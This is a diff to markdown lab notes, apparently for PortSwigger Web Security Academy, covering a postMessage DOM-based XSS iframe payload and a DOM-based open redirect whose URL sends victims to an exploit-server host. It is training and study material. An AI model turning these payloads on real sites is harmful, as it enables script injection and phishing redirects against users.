@@ -53,3 +53,17 @@ In order to solve the lab we need to make the victim access below page containin
 ```
 <iframe src="https://0a7700ea031731ad82d2bfc000f8002b.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}", "*")'></iframe>
 ```
+
+## DOM-based open redirection
+
+`Back to blog` link is generated via `onlick` effect, which takes `url` query param without validation and sanitization and passes it to `location.href`. The query will be passed only if param starts with `http`, so it makes using `javascript:` pseudo protocol for code execution unusable.
+
+```
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+```
+
+To solve the lab, we need to access the url with open redirection to exploit server
+
+```
+https://0a7f004b034dd93b81637a8000cc00b5.web-security-academy.net/post?postId=7&url=https://exploit-0ad300ad037ad90381cd794e01dc0079.exploit-server.net/
+```
